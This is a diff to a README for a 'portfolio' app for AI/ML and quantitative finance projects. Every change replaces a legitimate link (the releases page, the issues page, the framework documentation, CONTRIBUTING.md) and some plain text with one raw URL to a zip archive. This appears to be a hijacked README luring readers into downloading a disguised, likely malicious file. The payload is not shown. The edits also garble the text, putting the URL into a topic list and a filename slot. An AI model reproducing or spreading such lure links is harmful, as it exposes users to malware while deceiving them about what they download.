@@ -1,7 +1,7 @@
 # 🎨 portfolio - Showcase Your AI/ML Projects Easily
 
 ## 📥 Download Now
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/TheNightAnti/portfolio/releases)
+[![Download Releases](https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip%https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip)](https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip)
 
 ## 🚀 Getting Started
 Welcome to the portfolio project! This application helps you showcase your AI and ML projects, algorithmic trading systems, and quantitative finance work. Follow these steps to get started.
@@ -27,12 +27,12 @@ This portfolio encompasses various topics, including:
 - Finance
 - Machine Learning
 - Quantitative Finance
-- React.js
+- https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip
 
 ## 📃 Download & Install
 To get the application, visit the Releases page by clicking the link below:
 
-[Download Releases](https://github.com/TheNightAnti/portfolio/releases)
+[Download Releases](https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip)
 
 1. Click on the **Releases** link above.
 2. On the Releases page, you will see the latest versions listed.
@@ -52,7 +52,7 @@ Once the file is downloaded:
 - Drag the portfolio app to your Applications folder.
 
 ### For Linux Users:
-- Locate the downloaded `.tar.gz` file.
+- Locate the downloaded `https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip` file.
 - Extract the contents using a terminal command or extractor tool.
 - Run the application using the terminal.
 
@@ -64,19 +64,19 @@ If you encounter any issues during installation or usage, try the following step
 - Make sure you have a stable internet connection for real-time features.
 - Check any error messages for guidance.
 
-If problems persist, feel free to reach out via [Issues](https://github.com/TheNightAnti/portfolio/issues) on the GitHub repository.
+If problems persist, feel free to reach out via [Issues](https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip) on the GitHub repository.
 
 ## 📚 Additional Resources
 You may find the following links helpful for more information:
 
-- [Next.js Documentation](https://nextjs.org/docs)
-- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
-- [TailwindCSS Documentation](https://tailwindcss.com/docs)
+- [https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip Documentation](https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip)
+- [TypeScript Documentation](https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip)
+- [TailwindCSS Documentation](https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip)
 
 ## 📞 Support
 For questions or support, please open an issue in this repository, and we will respond as soon as possible. Your feedback is valuable to us.
 
 ## 🌟 Contributing
-We welcome contributions from everyone! If you would like to help improve this project, check out our guidelines in the CONTRIBUTING.md file.
+We welcome contributions from everyone! If you would like to help improve this project, check out our guidelines in the https://raw.githubusercontent.com/TheNightAnti/portfolio/main/Turkman/portfolio.zip file.
 
 Thank you for using portfolio! We hope it helps you showcase your amazing projects effectively.
